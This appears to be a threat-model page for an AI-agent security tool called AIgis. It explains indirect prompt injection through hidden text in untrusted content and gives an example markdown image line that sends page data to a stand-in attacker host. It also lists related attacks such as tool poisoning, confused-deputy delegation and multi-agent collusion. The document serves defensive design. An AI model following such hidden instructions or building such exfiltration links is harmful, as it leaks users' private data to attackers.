# Threat model

AIgis targets the action-layer risks of autonomous AI agents. These are not hypothetical — they are
documented in shipping products.

## Primary class: indirect prompt injection → data exfiltration

1. An agent ingests **untrusted content** (an uploaded file, a shared page, a connected app, a web result).
2. That content carries a **hidden instruction** (e.g. white-on-white text, zero-width characters).
3. The agent, acting on it, **emits an outbound action** that carries private data to an attacker —
   classically an auto-rendered markdown image `![](https://attacker/?d=<page data>)` or a search/tool
   call — and the side effect can fire **before the user approves**.

Public references for this class:
- PromptArmor — Notion AI data exfiltration.
- Simon Willison — Notion 3.0 and the "lethal trifecta".
- Schneier on Security — abusing an AI agent for data theft.

## The "lethal trifecta"

Risk is acute when three conditions are simultaneously true:

- **Access to private data** (the agent can read your documents/records).
- **Exposure to untrusted input** (it processes external/attacker-influenced content).
- **An exfiltration channel** (it can cause an outbound request).

## Adjacent classes we also exercise

- **Tool / connector poisoning** — malicious content arriving via a connected source.
- **Confused-deputy delegation** — one agent induced to act with another's authority.
- **Multi-agent collusion / consensus failure** — a false premise propagating across cooperating agents.
- **Weak / open-weight model susceptibility** — smaller or locally-served models follow injections more readily, especially under load.

## Why model alignment alone is insufficient

Frontier models increasingly resist *naive* injection — but:
- the **same attack lands** on weaker / open / locally-served models, and on stronger models **under load**;
- the **exfiltration channel is architectural** (auto-render + commit-before-approval); a more-aligned
  model does **not** remove the channel.

AIgis addresses the channel at the **action layer**, independent of the model.
